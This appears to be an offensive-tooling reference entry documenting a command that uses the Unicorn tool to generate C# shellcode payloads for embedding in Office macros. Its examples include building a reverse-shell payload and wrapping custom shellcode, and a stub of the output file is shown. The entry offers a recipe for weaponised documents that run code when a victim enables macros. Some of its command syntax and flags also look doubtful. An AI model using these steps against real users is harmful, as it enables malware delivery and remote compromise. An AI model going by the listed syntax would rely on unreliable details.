---
id: 1242766c-1d6a-4b33-9369-51e27759edaa
type: command
executor: bash
data: python unicorn.py payload.cs cs macro
output: null
created_at: '2023-04-06T03:56:23.450942+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - payload-generation
  - office-macro
verified: true
validated: true
---

# unicorn-generate-macro-payload

## Command

```bash
python unicorn.py $_OUTPUT_FILE cs macro
```

## Description

This command uses the Unicorn tool to generate a C# payload file optimized for conversion to Office VBA macros. It takes shellcode (default or specified) and outputs it in a format suitable for embedding in Microsoft Office documents to enable code execution upon macro activation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_OUTPUT_FILE | Filename for the generated C# payload (e.g., payload.cs) | Yes |
| cs | Specifies C# as the output language | Yes (built-in) |
| macro | Targets the payload for Office macro format | Yes (built-in) |

## Examples

### Basic Usage

```bash
python unicorn.py reverse_shell.cs cs macro
```

Generates reverse_shell.cs with default shellcode for a reverse shell in macro-compatible C#.

### Advanced Usage

```bash
python unicorn.py custom_payload.cs cs macro --shellcode custom.bin
```

Uses a custom shellcode file for the payload generation.

## Expected Output

The command runs silently if successful, creating the specified .cs file. Sample file content:

```csharp
using System;
public class Payload {
    public static void Main() {
        byte[] shellcode = Convert.FromBase64String("[embedded shellcode]");
        // Execution logic for VBA adaptation
    }
}
```

No console output unless errors occur (e.g., "Invalid format" if args are wrong).

## Related

- [[procedures/Generate-Office-Macro-Payload-with-Unicorn]]
- [[tools/Unicorn-Payload-Generator]]
